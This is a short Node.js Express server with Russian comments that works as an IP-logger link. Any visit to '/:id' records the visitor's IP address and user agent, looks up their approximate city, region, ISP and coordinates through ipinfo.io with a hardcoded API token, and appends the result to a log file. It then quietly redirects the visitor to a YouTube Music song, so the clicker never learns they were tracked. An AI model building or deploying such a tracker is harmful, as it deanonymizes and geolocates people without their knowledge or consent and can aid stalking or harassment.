const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/:id', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        const ipInfo = await axios.get(`https://ipinfo.io/${ip}?token=7a9eeeb48f8390`);
        const data = ipInfo.data;

        const log = {
            time: new Date().toISOString(),
            ip: ip,
            city: data.city,
            region: data.region,
            country: data.country,
            org: data.org,
            loc: data.loc,
            timezone: data.timezone,
            userAgent: userAgent
        };

        // Записываем в лог
        fs.appendFileSync('log.txt', JSON.stringify(log) + '\n');

        // Редирект на песню
        res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
    } catch (err) {
        console.error('Ошибка:', err.message);
        res.redirect('https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK');
    }
});

app.listen(PORT, () => {
    console.log(`Сервер запущен на http://localhost:${PORT}`);
});
